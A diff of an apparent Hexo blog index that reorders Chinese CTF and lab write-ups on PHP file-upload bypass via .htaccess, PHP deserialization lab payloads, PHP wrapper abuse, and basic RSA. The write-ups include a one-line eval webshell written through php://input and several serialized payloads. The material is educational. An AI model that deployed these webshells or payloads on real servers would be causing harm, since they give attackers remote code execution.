@@ -787,40 +787,6 @@
       </tags>
   </entry>
   <entry>
-    <title>(.htaccess+script)[GXYCTF2019]BabyUpload</title>
-    <url>/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731946450-102dae86-780f-4b7a-8222-21b24dd58230.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731960615-14bf03ed-53af-4ccb-86e1-754fb3f36799.png" alt="img"></p>
-<p>1.上传php文件</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731991227-e3ce0e92-9489-4942-a1c8-e72c3bfd6d03.png" alt="img"></p>
-<p>可见有后缀名过滤</p>
-<p>2.上传jpg文件</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732037682-6084f936-f4e2-4a02-9294-e9c8d62162cd.png" alt="img"></p>
-<p>可见对文件内容为&lt;?可能有过滤</p>
-<p>3.上传.htaccess文件</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732095861-09069902-ef31-4645-ab56-db23820b48fe.png" alt="img"></p>
-<p>经过分析，是mime类型过滤</p>
-<p>将mime类型改为image/jpeg即可</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732206598-0ea5576d-0923-4721-b3dd-ce9694c0b642.png" alt="img"></p>
-<p>AddType application/x-httpd-php .jpg</p>
-<p>这句话的意思是将jpg文件后缀解析为php文件</p>
-<p>4.传🐎</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732328192-ada01c3d-260b-40f2-bb47-09e90cc15fbe.png" alt="img"></p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732337448-2482057a-0460-4657-bdb6-2a36ca8c0b09.png" alt="img"></p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732383108-234defa1-ea71-4295-8e68-2528bc5fb9e4.png" alt="img"></p>
-<p>5.getshell</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732456086-1aa5e05f-4369-4123-90f1-6ffabc518d3c.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>(load_file&amp;into outfile)云演sql注入基础</title>
     <url>/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807114141-123d5599-d2ce-4598-afc6-018fd82e76ef.png" alt="img"></p>
@@ -851,6 +817,40 @@
 ]]></content>
       <categories>
         <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>(.htaccess+script)[GXYCTF2019]BabyUpload</title>
+    <url>/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731946450-102dae86-780f-4b7a-8222-21b24dd58230.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731960615-14bf03ed-53af-4ccb-86e1-754fb3f36799.png" alt="img"></p>
+<p>1.上传php文件</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731991227-e3ce0e92-9489-4942-a1c8-e72c3bfd6d03.png" alt="img"></p>
+<p>可见有后缀名过滤</p>
+<p>2.上传jpg文件</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732037682-6084f936-f4e2-4a02-9294-e9c8d62162cd.png" alt="img"></p>
+<p>可见对文件内容为&lt;?可能有过滤</p>
+<p>3.上传.htaccess文件</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732095861-09069902-ef31-4645-ab56-db23820b48fe.png" alt="img"></p>
+<p>经过分析，是mime类型过滤</p>
+<p>将mime类型改为image/jpeg即可</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732206598-0ea5576d-0923-4721-b3dd-ce9694c0b642.png" alt="img"></p>
+<p>AddType application/x-httpd-php .jpg</p>
+<p>这句话的意思是将jpg文件后缀解析为php文件</p>
+<p>4.传🐎</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732328192-ada01c3d-260b-40f2-bb47-09e90cc15fbe.png" alt="img"></p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732337448-2482057a-0460-4657-bdb6-2a36ca8c0b09.png" alt="img"></p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732383108-234defa1-ea71-4295-8e68-2528bc5fb9e4.png" alt="img"></p>
+<p>5.getshell</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732456086-1aa5e05f-4369-4123-90f1-6ffabc518d3c.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件上传</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -918,6 +918,37 @@
       </tags>
   </entry>
   <entry>
+    <title>php-SER-libs反序列化靶场</title>
+    <url>/2023/01/07/php-SER-libs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;flag&#x27;]);</span><br><span class="line">$a-&gt;action();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>构造类的实例化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new a();</span><br><span class="line">$a-&gt;act=&quot;show_source(&#x27;flag.php&#x27;);&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>看代码的意思$a-&gt;login()为真时，输出flag</p>
+<p>也就是uesr=daydream   pass=ok</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">$aa=new mylogin();</span><br><span class="line">$aa-&gt;user=&quot;daydream&quot;;</span><br><span class="line">$aa-&gt;pass=&quot;ok&quot;;</span><br><span class="line">$s=serialize($aa);</span><br><span class="line">print_r()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<p>?param=O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_COOKIE[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>和上一题的payload一样，不过把param后面的值进行url编码</p>
+<p>![img]1671089842139-0a4d683f-f080-41bb-a5dd-22e61914c88e.png)</p>
+]]></content>
+      <categories>
+        <category>反序列化</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(phar伪协议上传webshell)[NISACTF 2022]bingdundun~</title>
     <url>/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/</url>
     <content><![CDATA[<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671152984224-93f6d96f-3aee-45d6-b849-6d2ee1f3428c.png" alt="img"></p>
@@ -959,37 +990,6 @@
       </categories>
       <tags>
         <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php-SER-libs反序列化靶场</title>
-    <url>/2023/01/07/php-SER-libs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;flag&#x27;]);</span><br><span class="line">$a-&gt;action();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<p>构造类的实例化</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new a();</span><br><span class="line">$a-&gt;act=&quot;show_source(&#x27;flag.php&#x27;);&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>看代码的意思$a-&gt;login()为真时，输出flag</p>
-<p>也就是uesr=daydream   pass=ok</p>
-<p>构造</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">$aa=new mylogin();</span><br><span class="line">$aa-&gt;user=&quot;daydream&quot;;</span><br><span class="line">$aa-&gt;pass=&quot;ok&quot;;</span><br><span class="line">$s=serialize($aa);</span><br><span class="line">print_r()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>payload</p>
-<p>?param=O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_COOKIE[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>和上一题的payload一样，不过把param后面的值进行url编码</p>
-<p>![img]1671089842139-0a4d683f-f080-41bb-a5dd-22e61914c88e.png)</p>
-]]></content>
-      <categories>
-        <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1077,6 +1077,30 @@
       </tags>
   </entry>
   <entry>
+    <title>php伪协议</title>
+    <url>/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1671075085334-f8db25b9-a34c-4389-bcc8-456136aa10b3.png" alt="img"></p>
+<span id="more"></span>
+
+<p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">https://www.cnblogs.com/zzjdbk/p/13030717.html</a></p>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。<br>用法：?file=php://input 数据利用POST传过去</p>
+<h2 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h2><p>碰到file_get_contents()就要想到用php://input绕过，因为php伪 也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p>通过input获取webshell<br>写入一句话木马<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>‘);?&gt;</p>
+<p>这句话的意思就是把<?php @eval($_POST[cmd])?> 写入shell.php文件内</p>
+<h2 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985517502-8a69e911-3940-44ac-ba57-3d9da4d9357c.png" alt="img"></p>
+<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985533813-9ec7942b-c948-4f4e-95a2-9d88077040a1.png" alt="img"></p>
+<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985642874-68dc50ef-5eaa-41c1-b524-521e956fa458.png" alt="img"></p>
+<h2 id="zip伪协议"><a href="#zip伪协议" class="headerlink" title="zip伪协议"></a>zip伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985545426-183eb807-c399-45f5-9f46-a970ba1aa748.png" alt="img"></p>
+<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985621872-439b3aed-aa5b-4b67-a199-a1d3e95c3f4d.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(private私有反序列化)[极客大挑战 2019]PHP</title>
     <url>/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/</url>
     <content><![CDATA[<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671589654129-abe73843-e387-480b-9967-47bf36e15a3e.png" alt="img"></p>
@@ -1135,30 +1159,6 @@ print(serialize($name));
 ]]></content>
       <categories>
         <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php伪协议</title>
-    <url>/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1671075085334-f8db25b9-a34c-4389-bcc8-456136aa10b3.png" alt="img"></p>
-<span id="more"></span>
-
-<p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">https://www.cnblogs.com/zzjdbk/p/13030717.html</a></p>
-<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。<br>用法：?file=php://input 数据利用POST传过去</p>
-<h2 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h2><p>碰到file_get_contents()就要想到用php://input绕过，因为php伪 也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
-<p>通过input获取webshell<br>写入一句话木马<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>‘);?&gt;</p>
-<p>这句话的意思就是把<?php @eval($_POST[cmd])?> 写入shell.php文件内</p>
-<h2 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985517502-8a69e911-3940-44ac-ba57-3d9da4d9357c.png" alt="img"></p>
-<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985533813-9ec7942b-c948-4f4e-95a2-9d88077040a1.png" alt="img"></p>
-<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985642874-68dc50ef-5eaa-41c1-b524-521e956fa458.png" alt="img"></p>
-<h2 id="zip伪协议"><a href="#zip伪协议" class="headerlink" title="zip伪协议"></a>zip伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985545426-183eb807-c399-45f5-9f46-a970ba1aa748.png" alt="img"></p>
-<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985621872-439b3aed-aa5b-4b67-a199-a1d3e95c3f4d.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -1441,6 +1441,46 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </tags>
   </entry>
   <entry>
+    <title>基础RSA</title>
+    <url>/2023/01/07/%E5%9F%BA%E7%A1%80RSA/</url>
+    <content><![CDATA[<ol>
+<li>什么是RSA<br>RSA算法是现今使用最广泛的公钥密码算法，也是号称地球上最安全的加密算法。在了解RSA算法之前，先熟悉下几个术语<br>根据密钥的使用方法，可以将密码分为对称密码和公钥密码<br>对称密码：加密和解密使用同一种密钥的方式<br>公钥密码：加密和解密使用不同的密码的方式，因此公钥密码通常也称为非对称密码。 </li>
+<li>RSA加密<br>RSA的加密过程可以使用一个通式来表达 </li>
+</ol>
+<span id="more"></span>
+
+<p>密文＝明文EmodN<br>密文＝明文EmodN<br>也就是说RSA加密是对明文的E次方后除以N后求余数的过程。就这么简单？对，就是这么简单。<br>从通式可知，只要知道E和N任何人都可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说E和N的组合就是公钥，我们用(E,N)来表示公钥</p>
+<p>公钥＝(E,N)<br>公钥＝(E,N)<br>不过E和N不并不是随便什么数都可以的，它们都是经过严格的数学计算得出的，关于E和N拥有什么样的要求及其特性后面会讲到。顺便啰嗦一句E是加密（Encryption）的首字母，N是数字（Number）的首字母</p>
+<ol>
+<li>RSA解密<br>RSA的解密同样可以使用一个通式来表达</li>
+</ol>
+<p>明文＝密文DmodN<br>明文＝密文DmodN<br>也就是说对密文进行D次方后除以N的余数就是明文，这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥</p>
+<p>私钥＝(D,N)<br>私钥＝(D,N)<br>从上述可以看出RSA的加密方式和解密方式是相同的，加密是求“E次方的mod N”;解密是求“D次方的mod N”<br>此处D是解密（Decryption）的首字母；N是数字（Number）的首字母。</p>
+<p>小结下</p>
+<p>公钥    （E，N）<br>私钥    （D，N）<br>密钥对    （E，D，N）<br>加密<br>密文＝明文EmodN<br>密文＝明文EmodN<br>解密<br>明文＝密文DmodN<br>明文＝密文DmodN<br>\4. 生成密钥对<br>既然公钥是（E，N），私钥是（D，N）所以密钥对即为（E，D，N）但密钥对是怎样生成的？步骤如下：</p>
+<p>求N<br>求L（L为中间过程的中间数）<br>求E<br>求D<br>4.1 求N<br>准备两个质数p，q。这两个数不能太小，太小则会容易破解，将p乘以q就是N</p>
+<p>N=p∗q<br>N=p∗q<br>4.2 求L<br>L 是 p－1 和 q－1的最小公倍数，可用如下表达式表示</p>
+<p>L=lcm（p－1，q－1）<br>L=lcm（p－1，q－1）<br>4.3 求E<br>E必须满足两个条件：E是一个比1大比L小的数，E和L的最大公约数为1<br>用gcd(X,Y)来表示X，Y的最大公约数则E条件如下：</p>
+<p>1 &lt; E &lt; L<br>gcd（E，L）=1<br>之所以需要E和L的最大公约数为1是为了保证一定存在解密时需要使用的数D。现在我们已经求出了E和N也就是说我们已经生成了密钥对中的公钥了。</p>
+<p>4.4 求D<br>数D是由数E计算出来的。D、E和L之间必须满足以下关系：</p>
+<p>1 &lt; D &lt; L<br>E＊D mod L ＝ 1<br>只要D满足上述2个条件，则通过E和N进行加密的密文就可以用D和N进行解密。<br>简单地说条件2是为了保证密文解密后的数据就是明文。<br>现在私钥自然也已经生成了，密钥对也就自然生成了。<br>小结下：</p>
+<p>求N    N＝ p ＊ q ；p，q为质数<br>求L    L＝lcm（p－1，q－1） ；L为p－1、q－1的最小公倍数<br>求E    1 &lt; E &lt; L，gcd（E，L）=1；E，L最大公约数为1（E和L互质）<br>求D    1 &lt; D &lt; L，E＊D mod L ＝ 1<br>5 实践下吧<br>我们用具体的数字来实践下RSA的密钥对对生成，及其加解密对全过程。为方便我们使用较小数字来模拟。</p>
+<p>5.1 求N<br>我们准备两个很小对质数，<br>p ＝ 17<br>q ＝ 19<br>N ＝ p ＊ q ＝ 323</p>
+<p>5.2 求L<br>L ＝ lcm（p－1， q－1）＝ lcm(16，18） ＝ 144<br>144为16和18对最小公倍数</p>
+<p>5.3 求E<br>求E必须要满足2个条件：1 &lt; E &lt; L ，gcd（E，L）=1<br>即1 &lt; E &lt; 144，gcd（E，144） ＝ 1<br>E和144互为质数，5显然满足上述2个条件<br>故E ＝ 5</p>
+<p>此时公钥=(E，N）＝ （5，323）</p>
+<p>5.4 求D<br>求D也必须满足2个条件：1 &lt; D &lt; L，E＊D mod L ＝ 1<br>即1 &lt; D &lt; 144，5 ＊ D mod 144 ＝ 1<br>显然当D＝ 29 时满足上述两个条件<br>1 &lt; 29 &lt; 144<br>5＊29 mod 144 ＝ 145 mod 144 ＝ 1<br>此时私钥＝（D，N）＝（29，323）</p>
+<p>5.5 加密<br>准备的明文必须时小于N的数，因为加密或者解密都要mod N其结果必须小于N<br>假设明文 ＝ 123<br>则 密文＝明文EmodN＝1235mod323=225密文＝明文EmodN＝1235mod323=225<br>5.6 解密<br>明文＝密文DmodN＝22529mod323=123明文＝密文DmodN＝22529mod323=123<br>解密后的明文为123。<br><a href="https://blog.csdn.net/dbs1215/article/details/48953589">https://blog.csdn.net/dbs1215/article/details/48953589</a></p>
+<p>附上一脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time : 2022/12/6 10:10</span><br><span class="line"># @Author : 阿伦</span><br><span class="line"># @File : 1</span><br><span class="line"># @Project : py</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">n = p * q</span><br><span class="line"># 密文</span><br><span class="line">C = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - 1) * (q - 1))</span><br><span class="line">print(d)</span><br><span class="line"># 求明文</span><br><span class="line">M = pow(C, d, n)  # 快速求幂取模运算</span><br><span class="line">print(M)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>RSA基础</category>
+      </categories>
+      <tags>
+        <tag>RSA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>常用sql注入判断</title>
     <url>/2023/01/07/%E5%B8%B8%E7%94%A8sql%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD/</url>
     <content><![CDATA[<h1 id="‘-OR-1-1"><a href="#‘-OR-1-1" class="headerlink" title="‘ OR 1=1"></a>‘ OR 1=1</h1><p>一般SQL代码中会有这么一段<br>SELECT * FROM TABLENAME WHERE ID = 变量，<br>当通过注入后会变成<br>SELECT * FROM TABLENAME WHERE ID = 变量 OR 1=1;<br>就会使WHERE后面的表达式变成一句可有可无的表达式，与<br>SELECT * FROM TABLENAME相等<br>然后就可以通过这种句式来取得当前数据表中所有的用户信息。</p>
@@ -1494,43 +1534,16 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </tags>
   </entry>
   <entry>
-    <title>基础RSA</title>
-    <url>/2023/01/07/%E5%9F%BA%E7%A1%80RSA/</url>
-    <content><![CDATA[<ol>
